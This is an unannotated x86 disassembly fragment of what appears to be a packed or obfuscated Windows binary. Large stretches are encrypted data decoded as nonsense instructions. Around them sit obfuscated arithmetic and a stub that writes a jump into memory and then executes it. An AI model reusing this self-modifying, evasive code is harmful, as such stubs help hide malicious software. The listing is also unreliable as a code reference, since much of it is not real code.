  40d50f:	xchg   edx,eax
  40d510:	push   0x7b
  40d512:	call   0x2a216a7a
  40d517:	ret    
  40d518:	mov    edx,0xad5e4a38
  40d51d:	cmp    BYTE PTR [ebx+0xb],0x54
  40d521:	test   BYTE PTR [ecx-0x6],ah
  40d524:	mov    eax,0xf36d91b0
  40d529:	add    edi,ecx
  40d52b:	lods   al,BYTE PTR ds:[esi]
  40d52c:	sar    BYTE PTR [edx-0x13],0xd2
  40d530:	adc    eax,0x1d025820
  40d535:	call   0x9032:0x49dbfedf
  40d53c:	xchg   edi,eax
  40d53d:	xchg   edi,eax
  40d53e:	mov    DWORD PTR [ebx],esp
  40d540:	outs   dx,DWORD PTR ds:[esi]
  40d541:	loopne 0x40d55a
  40d543:	hlt    
  40d544:	scas   al,BYTE PTR es:[edi]
  40d545:	dec    edi
  40d546:	sub    cl,BYTE PTR [esi+0x2f1bb3b1]
  40d54c:	jae    0x40d567
  40d54e:	imul   ecx,DWORD PTR [ebx+0x2ae3b864],0xf20365f2
  40d558:	iret   
  40d559:	adc    edi,0x3e
  40d55c:	out    0x59,eax
  40d55e:	out    dx,al
  40d55f:	das    
  40d560:	mov    WORD PTR [edx-0x2c],ds
  40d563:	mov    BYTE PTR [ebx+0x74],dh
  40d566:	stos   DWORD PTR es:[edi],eax
  40d567:	retf   0x41d7
  40d56a:	(bad)  
  40d56b:	ds loop 0x40d50b
  40d56e:	out    0xb0,al
  40d570:	jno    0x40d5b9
  40d572:	lahf   
  40d573:	jo     0x40d4fb
  40d575:	call   DWORD PTR [ebp+0x46]
  40d578:	loope  0x40d57e
  40d57a:	cmp    eax,0x517d9dc4
  40d57f:	push   0x66
  40d581:	xchg   DWORD PTR ds:0x1fff4bd6,ebx
  40d587:	xor    edx,DWORD PTR [eax-0x23db06e3]
  40d58d:	ror    DWORD PTR [ebx+eiz*2],1
  40d590:	fistp  DWORD PTR [edi+0x14]
  40d593:	mov    esp,0x2783d5e1
  40d598:	imul   edi,ebp,0xffffffcf
  40d59b:	add    al,0x22
  40d59d:	xchg   edi,eax
  40d59e:	clc    
  40d59f:	push   es
  40d5a0:	cli    
  40d5a1:	xchg   esi,eax
  40d5a2:	mov    DWORD PTR [esi-0x75],ebp
  40d5a5:	inc    ebp
  40d5a6:	hlt    
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x422283
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x422708
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x422708
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x422810
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x422808],eax
  40d707:	inc    DWORD PTR ds:0x422810
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422584
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x4227f8
  40d78f:	push   DWORD PTR ds:0x42258c
  40d795:	push   DWORD PTR ds:0x4227d8
  40d79b:	push   DWORD PTR ds:0x42284c
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x422708
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	pop    ecx
  40d7f8:	test   eax,0xf065e3aa
  40d7fd:	mov    esi,0xbec492be
  40d802:	mov    esi,0x927c49e5
  40d807:	inc    ebp
  40d808:	in     al,0x2c
  40d80a:	lock xor dl,BYTE PTR [ebx]
  40d80d:	js     0x40d867
  40d80f:	(bad)  
  40d810:	xchg   ebp,eax
  40d811:	jle    0x40d7a8
  40d813:	dec    edx
  40d814:	xchg   ebx,eax
  40d815:	push   ebx
  40d816:	lock xchg esi,eax
  40d818:	inc    edi
  40d819:	cmp    dl,ah
  40d81b:	add    edx,DWORD PTR [ecx-0x27437850]
  40d821:	jmp    0x8ab0:0xaa309189
  40d828:	pop    ecx
  40d829:	addr16 (bad) 
  40d82b:	dec    edi
  40d82c:	leave  
  40d82d:	xor    DWORD PTR [ecx-0x17],ebp
  40d830:	jp     0x40d7cb
  40d832:	xor    al,0xe3
  40d834:	test   eax,0x7996a878
  40d839:	out    dx,al
  40d83a:	out    dx,al
  40d83b:	arpl   sp,cx
  40d83d:	(bad)  
  40d83e:	fmul   DWORD PTR [edi-0xf8a0d84]
  40d844:	xchg   ecx,eax
  40d846:	pop    ebx
  40d847:	pop    esp
  40d848:	pop    ecx
  40d849:	sub    al,0x40
  40d84b:	in     al,dx
  40d84c:	xchg   BYTE PTR [edi],dh
  40d84e:	xlat   BYTE PTR ds:[ebx]
  40d84f:	je     0x40d8b6
  40d851:	out    dx,al
  40d852:	out    0xc1,al
  40d854:	inc    edi
  40d855:	test   BYTE PTR [edi+0x14],dh
  40d858:	push   0xffffff9e
  40d85a:	ds push 0xfffffff1
  40d85d:	repnz scas eax,DWORD PTR es:[edi]
  40d85f:	out    0x3d,eax
  40d861:	(bad)  
  40d862:	add    eax,0xcad8f422
  40d867:	dec    ebp
  40d868:	imul   eax,DWORD PTR [ecx-0x1b],0xf6403e42
  40d86f:	mov    BYTE PTR [eax-0x78],dh
  40d872:	adc    dl,BYTE PTR [esi-0x2aa2b8be]
  40d878:	mov    edi,DWORD PTR ds:0x99c8a2e8
  40d87e:	pop    esi
  40d87f:	dec    esp
  40d880:	inc    DWORD PTR [edx+eax*1+0x5a]
  40d884:	jl     0x40d8bc
  40d886:	mov    ebx,0xb3d6be46
  40d88b:	add    eax,0x131e821e
  40d890:	call   0x5cdf51e5
  40d895:	cmp    edi,DWORD PTR [edx-0x6e2a67e7]
  40d89b:	jnp    0x40d8f3
  40d89d:	push   0x563a646c
  40d8a2:	les    eax,FWORD PTR [ecx-0x41e0fd48]
  40d8a8:	mul    DWORD PTR [ebp+0x58]
  40d8ab:	out    dx,eax
  40d8ac:	dec    esp
  40d8ad:	pop    eax
  40d8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8af:	lea    eax,[esi-0x64]
  40d8b2:	jo     0x40d8ff
  40d8b4:	cmp    al,0xbe
  40d8b6:	in     eax,dx
  40d8b7:	outs   dx,BYTE PTR ds:[esi]
  40d8b8:	inc    edx
  40d8b9:	mov    edx,0xcf6f1b98
  40d8be:	xor    edi,DWORD PTR [ebx]
  40d8c0:	stos   BYTE PTR es:[edi],al
  40d8c1:	rcr    BYTE PTR [edi],cl
  40d8c3:	clc    
  40d8c4:	jecxz  0x40d87f
  40d8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c7:	mov    ebp,0x732eb888
  40d8cc:	in     eax,dx
  40d8cd:	mov    eax,0xa33dd79
  40d8d2:	jo     0x40d916
  40d8d4:	stos   DWORD PTR es:[edi],eax
  40d8d5:	push   0x40
  40d8d7:	mov    ds,ebp
  40d8d9:	jns    0x40d8a4
  40d8db:	sbb    eax,0xe74a8671
  40d8e0:	mov    ?,WORD PTR [edx+0x7d]
  40d8e3:	outs   dx,BYTE PTR ds:[esi]
  40d8e4:	add    eax,0x85ba1301
  40d8e9:	mov    eax,0x322279b0
  40d8ee:	ret    
  40d8ef:	xor    DWORD PTR [esi+0x6895b82f],edi
  40d8f5:	jnp    0x40d88c
  40d8f7:	pop    esp
  40d8f8:	adc    edx,DWORD PTR ds:0x3e3d166
  40d8fe:	ficom  DWORD PTR [ecx-0x42]
  40d901:	xchg   edx,ebx
  40d903:	int    0xd4
  40d905:	mov    WORD PTR [esi],es
  40d907:	add    eax,0x2e6d8876
  40d90c:	adc    al,0x5d
  40d90e:	xlat   BYTE PTR ds:[ebx]
  40d90f:	inc    ecx
  40d910:	fcom   QWORD PTR [esi]
  40d912:	xchg   esp,eax
  40d913:	jo     0x40d8d2
  40d915:	or     esi,edi
  40d917:	stc    
  40d918:	and    dh,BYTE PTR [ebx+0x6368b327]
  40d91e:	mov    esp,0xa7c9e4ce
  40d923:	loope  0x40d932
  40d925:	jle    0x40d8ba
  40d927:	leave  
  40d928:	lock ja 0x40d9aa
  40d92b:	shl    BYTE PTR [ebx+0x6cb452b9],0x1f
  40d932:	outs   dx,DWORD PTR ds:[esi]
  40d933:	cmp    DWORD PTR [esi-0x1b],eax
  40d936:	dec    esp
  40d937:	inc    edx
  40d938:	(bad)  
  40d939:	fwait
  40d93a:	sbb    BYTE PTR ds:0xf4d9e470,bl
  40d940:	inc    ecx
  40d941:	pop    ss
  40d942:	enter  0x6c15,0xd6
  40d946:	call   0xb5a8:0x95d9cb8f
  40d94d:	cmp    al,0x7f
  40d94f:	(bad)
  40d952:	xor    DWORD PTR [ebp+ebx*2+0x34],ebp
  40d956:	sahf   
  40d957:	ins    DWORD PTR es:[edi],dx
  40d958:	nop
  40d959:	inc    edi
  40d95a:	cmp    DWORD PTR [edx],0x40
  40d95d:	dec    ebp
  40d95e:	xor    eax,0x544fe1d0
  40d963:	jge    0x40d9bc
  40d965:	out    dx,eax
  40d966:	jecxz  0x40d952
  40d968:	push   ebp
  40d969:	adc    edx,DWORD PTR [ebx+0x25]
  40d96c:	icebp  
  40d96d:	fmul   QWORD PTR [edi+0x6c31aa6b]
  40d973:	loope  0x40d9e8
  40d975:	not    ch
  40d977:	or     edi,DWORD PTR [esi+0x33]
  40d97a:	pop    es
  40d97b:	cmp    esp,DWORD PTR [eax+0x6b]
  40d97e:	in     al,0x6f
  40d980:	jnp    0x40d99c
  40d982:	sbb    DWORD PTR [ebx+0x65],edx
  40d985:	in     eax,0x3a
  40d987:	cwde   
  40d988:	call   0x1721:0xff3e1143
  40d98f:	fcomi  st,st(3)
  40d991:	pop    es
  40d992:	pop    eax
  40d993:	dec    ebp
  40d994:	arpl   si,sp
  40d996:	adc    eax,DWORD PTR [eax-0x525706e1]
  40d99c:	dec    edx
  40d99d:	and    bh,dh
  40d99f:	or     ebp,esi
  40d9a1:	ss aas 
  40d9a3:	jnp    0x40d9d2
  40d9a5:	(bad)  
  40d9a7:	or     esi,ebx
  40d9a9:	in     al,0x9
  40d9ab:	aas    
  40d9ac:	(bad)  
  40d9ad:	movzx  ebx,BYTE PTR [edi+0x29e23643]
  40d9b4:	sbb    BYTE PTR [edx-0x57eeb2f8],bh
  40d9ba:	push   eax
  40d9bb:	call   0x8c87:0xd7cc0f67
  40d9c2:	pop    edx
  40d9c3:	out    dx,al
  40d9c4:	out    0xe7,eax
  40d9c6:	jnp    0x40d98c
  40d9c8:	fs mov eax,0xacb2dfd1
  40d9ce:	cmp    BYTE PTR [edi+0x66],al
  40d9d1:	inc    ebp
  40d9d2:	xchg   edi,eax
  40d9d3:	popa   
  40d9d4:	popf   
  40d9d5:	jnp    0x40da1e
  40d9d7:	pop    edi
  40d9d8:	inc    ebp
  40d9d9:	jmp    0x40d9d4
  40d9db:	jb     0x40da12
  40d9dd:	scas   eax,DWORD PTR es:[edi]
  40d9de:	mov    dl,BYTE PTR [ebx+0x1e4c4d71]
  40d9e4:	imul   eax,edi,0x2440cac4
  40d9ea:	mov    al,ds:0x656be9f7
  40d9ef:	and    cl,BYTE PTR [edx+0x3fcee044]
  40d9f5:	ret    
  40d9f6:	test   BYTE PTR [ebp-0x2a],bh
  40d9f9:	inc    eax
  40d9fa:	inc    edi
  40d9fb:	je     0x40da0a
  40d9fd:	inc    edx
  40d9fe:	inc    esp
  40d9ff:	or     eax,DWORD PTR [ebp+0x9a3812a]
  40da05:	adc    eax,0x1b4b611c
  40da0a:	sbb    BYTE PTR [eax+ecx*2+0x7c0b3fe4],cl
  40da11:	jmp    0x2f7e:0x15c8b923
  40da18:	test   BYTE PTR ds:0xbbe33d3e,0xbf
  40da1f:	pop    edi
  40da20:	inc    esp
  40da21:	dec    edi
  40da22:	mov    ch,0xc1
  40da24:	nop
  40da25:	fwait
  40da26:	mov    eax,ds:0x9af20246
  40da2b:	in     eax,dx
  40da2c:	pop    es
  40da2d:	test   cl,cl
  40da2f:	jns    0x40da29
  40da31:	or     al,0xb9
  40da33:	jecxz  0x40d9c8
  40da35:	adc    al,BYTE PTR [ebp+0x152a321a]
  40da3b:	inc    eax
  40da3c:	inc    ecx
  40da3d:	inc    esp
  40da3e:	jnp    0x40da44
  40da40:	push   ecx
  40da41:	rcl    ebp,1
  40da43:	addr16 int3 
  40da45:	(bad)  
  40da46:	in     eax,dx
  40da47:	cld    
  40da48:	pop    es
  40da49:	xor    ch,BYTE PTR [eax]
  40da4b:	retf   0xf449
  40da4e:	adc    cl,dl
  40da50:	stos   BYTE PTR es:[edi],al
  40da51:	in     al,0x8d
  40da53:	ret    
  40da54:	ins    DWORD PTR es:[edi],dx
  40da55:	sbb    edx,eax
  40da57:	push   ecx
  40da58:	pop    edi
  40da59:	shr    DWORD PTR [ebp-0x28],1
  40da5c:	(bad)  
  40da5d:	dec    esp
  40da5e:	mov    edi,0x12a44063
  40da63:	mov    dh,0x27
  40da65:	iret   
  40da66:	imul   DWORD PTR [ebx+ecx*1]
  40da69:	loope  0x40d9f7
  40da6b:	cs pop esp
  40da6d:	out    0x19,al
  40da6f:	mov    esi,DWORD PTR [edi+0x457e1a1d]
  40da75:	dec    eax
  40da76:	mov    ds:0x785f44e0,al
  40da7b:	js     0x40daee
  40da7d:	mov    BYTE PTR [eax-0x5],bh
  40da80:	(bad)  
  40da82:	inc    edx
  40da83:	mov    DWORD PTR [edx+0x7d],ebx
  40da86:	lahf   
  40da87:	lea    eax,gs:[ebx+0xefc0653]
  40da8e:	scas   al,BYTE PTR es:[edi]
  40da8f:	dec    ebx
  40da90:	push   ds
  40da91:	jne    0x40dad4
  40da93:	xchg   edx,eax
  40da94:	retf   
  40da95:	mov    ebx,0x8e54bea8
  40da9a:	mov    ebp,0x22d6f37c
  40da9f:	aam    0x86
  40daa1:	mov    al,0x7
  40daa3:	fcom   QWORD PTR [esi]
  40daa5:	push   esi
  40daa6:	cmp    BYTE PTR [eax-0x5ddd2de1],cl
  40daac:	adc    BYTE PTR [ecx-0x44f6e269],dl
  40dab2:	iret   
  40dab3:	int    0xb
  40dab5:	fimul  WORD PTR [ebx]
  40dab7:	mov    fs,WORD PTR [edx-0x48daa09c]
  40dabd:	pop    es
  40dabe:	scas   eax,DWORD PTR es:[edi]
  40dabf:	xor    bh,BYTE PTR [ebx+0xa]
  40dac2:	mov    BYTE PTR [ebx+0x26ff5fb0],bh
  40dac8:	sub    al,BYTE PTR [edi+eax*8-0x2d]
  40dacc:	sub    eax,0x5db03144
  40dad1:	mov    ds:0x209e11a9,al
  40dad6:	ja     0x40da61
  40dad8:	mov    dl,0x46
  40dada:	fld    QWORD PTR [eax]
  40dadc:	xor    eax,ebp
  40dade:	jbe    0x40da79
  40dae0:	test   BYTE PTR [esi],cl
  40dae2:	fwait
  40dae3:	xor    ecx,esi
  40dae5:	jmp    0x1069293c
  40daea:	sub    eax,0xf6f67c31
  40daef:	dec    edx
  40daf0:	adc    esi,DWORD PTR [edi+0x47]
  40daf3:	dec    esp
  40daf4:	outs   dx,BYTE PTR ds:[esi]
  40daf5:	loop   0x40dafd
  40daf7:	mov    dh,0xb0
  40daf9:	aam    0xc0
  40dafb:	add    al,0x7e
  40dafd:	jp     0x40daa0
  40daff:	push   ebx
  40db00:	ret    0xedb1
  40db03:	fld    QWORD PTR [edx-0x48]
  40db06:	popa   
  40db07:	pop    edx
  40db08:	cwde   
  40db09:	daa    
  40db0a:	mov    WORD PTR [edi-0x60fba7e4],gs
  40db10:	out    dx,al
  40db11:	cmp    al,0x50
  40db13:	push   esi
  40db14:	mov    ch,0xdf
  40db16:	adc    dl,ch
  40db18:	fild   WORD PTR [ebx]
  40db1a:	test   DWORD PTR [eax],edi
  40db1c:	jmp    0x6e54fc0e
  40db21:	popa   
  40db22:	pop    edx
  40db23:	es and al,0x73
  40db26:	ins    DWORD PTR es:[edi],dx
  40db27:	retf   0xb706
  40db2a:	dec    ecx
  40db2b:	aaa    
  40db2c:	adc    DWORD PTR [ebx],ebp
  40db2e:	leave  
  40db2f:	push   eax
  40db30:	call   0x29d129e4
  40db35:	or     ch,BYTE PTR [eax-0x67f273d2]
  40db3b:	(bad)  
  40db3c:	push   edx
  40db3d:	xchg   ebx,eax
  40db3e:	out    0xea,eax
  40db40:	pop    edi
  40db41:	rcl    cl,cl
  40db43:	xor    edi,DWORD PTR [ebx+ecx*2+0xa]
  40db47:	xlat   BYTE PTR ds:[ebx]
  40db48:	out    dx,al
  40db49:	inc    ecx
  40db4a:	pop    ecx
  40db4b:	dec    eax
  40db4c:	inc    ecx
  40db4d:	hlt    
  40db4e:	mov    eax,DWORD PTR [edx-0x142b0001]
  40db54:	fs push ebx
  40db56:	imul   edi,DWORD PTR [edi],0x26
  40db59:	mov    al,0x36
  40db5b:	(bad)
  40db5f:	or     edi,0x27672d40
  40db65:	push   esp
  40db66:	in     al,0x29
  40db68:	data16 je 0x40db09
  40db6b:	mov    bh,0x12
  40db6d:	pop    ecx
  40db6e:	mov    bl,0x49
  40db70:	enter  0x5748,0x27
  40db74:	iret   
  40db75:	adc    BYTE PTR [eax+0x35af41d8],ch
  40db7b:	dec    esi
  40db7c:	dec    edi
  40db7d:	push   edx
  40db7e:	sahf   
  40db7f:	(bad)  
  40db80:	stos   BYTE PTR es:[edi],al
  40db81:	sbb    DWORD PTR [ebx+0x7f4fe44],esi
  40db87:	repz fcmovnbe st,st(3)
  40db8a:	pop    esp
  40db8b:	sbb    eax,0xb3f5470e
  40db90:	pushf  
  40db91:	pusha  
  40db92:	aad    0x82
  40db94:	rol    BYTE PTR [eax-0xb],cl
  40db97:	or     BYTE PTR [edx-0x3e747775],ch
  40db9d:	mov    bl,0xb2
  40db9f:	arpl   WORD PTR [ebp+eax*2-0x7e],di
  40dba3:	fild   DWORD PTR [esi]
  40dba5:	mov    BYTE PTR [ecx],0xff
  40dba8:	mov    dl,0xb8
  40dbaa:	fcmovbe st,st(6)
  40dbac:	popf   
  40dbad:	cmp    al,0x9
  40dbaf:	enter  0x9def,0x3e
  40dbb3:	mov    ebx,0x9950e244
  40dbb8:	lahf   
  40dbb9:	dec    ebp
  40dbba:	int3   
  40dbbb:	jno    0x40dbd1
  40dbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbbe:	cld    
  40dbbf:	ret    
  40dbc0:	aam    0x1a
  40dbc2:	xor    dl,BYTE PTR [ebx]
  40dbc4:	dec    eax
  40dbc5:	adc    esi,DWORD PTR [esi]
  40dbc7:	fst    QWORD PTR [edi-0x5c8853fb]
  40dbcd:	sub    DWORD PTR [edx-0x4f],ecx
  40dbd0:	xchg   DWORD PTR [esi+ebp*1+0x6bd3dcc],edx
  40dbd7:	sub    al,0xc4
  40dbd9:	(bad)  
  40dbda:	push   edi
  40dbdb:	dec    edi
  40dbdc:	aaa    
  40dbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbde:	dec    eax
  40dbdf:	pop    edx
  40dbe0:	jnp    0x40db7b
  40dbe2:	or     BYTE PTR [eax],0x59
  40dbe5:	jne    0x40dbb0
  40dbe7:	mov    ecx,0x1447de48
  40dbec:	and    bl,BYTE PTR [eax-0x2]
  40dbef:	scas   eax,DWORD PTR es:[edi]
  40dbf0:	add    DWORD PTR [esi+0x5b],ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	shl    DWORD PTR [ebx+0x399e6070],1
  40dc31:	clc    
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0x893fb27f
  40dc3c:	mov    ecx,0x17b9e61e
  40dc41:	xchg   ebx,eax
  40dc42:	icebp  
  40dc43:	sub    al,0xac
  40dc45:	cmp    eax,0x47e7b531
  40dc4a:	fisubr DWORD PTR ds:0xb3ceeac6
  40dc50:	mov    dh,0x76
  40dc52:	pop    ebx
  40dc53:	jp     0x40dc8c
  40dc55:	mov    edx,0xb08e83a2
  40dc5a:	sti    
  40dc5b:	pop    ecx
  40dc5c:	xchg   esp,eax
  40dc5d:	cmp    al,0x81
  40dc5f:	sub    eax,DWORD PTR [ebp+0x3e]
  40dc62:	cmp    cl,BYTE PTR [ebp-0x3a66acc7]
  40dc68:	fwait
  40dc69:	pop    esi
  40dc6a:	mov    DWORD PTR [edi-0x2377330],esp
  40dc70:	adc    dl,cl
  40dc72:	adc    ah,cl
  40dc74:	mov    edx,0xd45805d5
  40dc79:	and    ecx,DWORD PTR [edx+0x3]
  40dc7c:	dec    eax
  40dc7d:	dec    ebp
  40dc7e:	or     eax,0x2c6ebb39
  40dc83:	lods   al,BYTE PTR ds:[esi]
  40dc84:	mov    dh,0xaa
  40dc86:	nop
  40dc87:	bound  edi,QWORD PTR [esi]
  40dc89:	pop    ds
  40dc8a:	push   0x1f66a470
  40dc8f:	pusha  
  40dc90:	and    cl,al
  40dc92:	pusha  
  40dc93:	scas   al,BYTE PTR es:[edi]
  40dc94:	iret   
  40dc95:	xchg   ecx,eax
  40dc96:	push   ebx
  40dc97:	lock fbstp TBYTE PTR [edx]
  40dc9a:	test   al,0xec
  40dc9c:	pop    ds
  40dc9d:	mov    eax,0xc343e435
  40dca2:	xchg   DWORD PTR [ecx+0x7],esp
  40dca5:	xchg   esi,eax
  40dca6:	loopne 0x40dc3d
  40dca8:	sbb    DWORD PTR [ebp-0x21],ebp
  40dcab:	test   eax,0x60e80e01
  40dcb0:	out    0x32,eax
  40dcb2:	pushf  
  40dcb3:	dec    ecx
  40dcb4:	mov    ch,0x13
  40dcb6:	mov    eax,ds:0x98740ee2
  40dcbb:	pop    ss
  40dcbc:	in     al,dx
  40dcbd:	add    edi,edi
  40dcbf:	dec    ebx
  40dcc0:	xor    DWORD PTR [ebp+0xe],esi
  40dcc3:	lock push ds
  40dcc5:	ja     0x40dccb
  40dcc7:	cmp    BYTE PTR [ebp-0x6bb275d9],dh
  40dccd:	push   edx
  40dcce:	sbb    BYTE PTR [eax],al
  40dcd0:	pop    edx
  40dcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd2:	dec    ebp
  40dcd3:	xor    DWORD PTR [ecx-0x16],esi
  40dcd6:	pop    edx
  40dcd7:	and    BYTE PTR [ebx-0x3c57d15d],ch
  40dcdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcde:	push   eax
  40dcdf:	xor    al,0x8b
  40dce1:	sbb    al,0x52
  40dce3:	(bad)  
  40dce4:	mov    bh,0x67
  40dce6:	outs   dx,BYTE PTR ds:[esi]
  40dce7:	retf   
  40dce8:	jl     0x40dd4e
  40dcea:	inc    esp
  40dceb:	pop    ss
  40dcec:	jle    0x40dd43
  40dcee:	pop    ds
  40dcef:	xchg   esi,eax
  40dcf0:	mov    cl,BYTE PTR [esi+0x5d]
  40dcf3:	pop    eax
  40dcf4:	popf   
  40dcf5:	clc    
  40dcf6:	mov    ebp,0x4c87cd7a
  40dcfb:	mov    esi,0x7d9951c9
  40dd00:	sub    edi,DWORD PTR [edx]
  40dd02:	cmp    bh,BYTE PTR [edx+0x4b5abe29]
  40dd08:	fsub   st(0),st
  40dd0a:	addr16 jne 0x40dcfb
  40dd0d:	das    
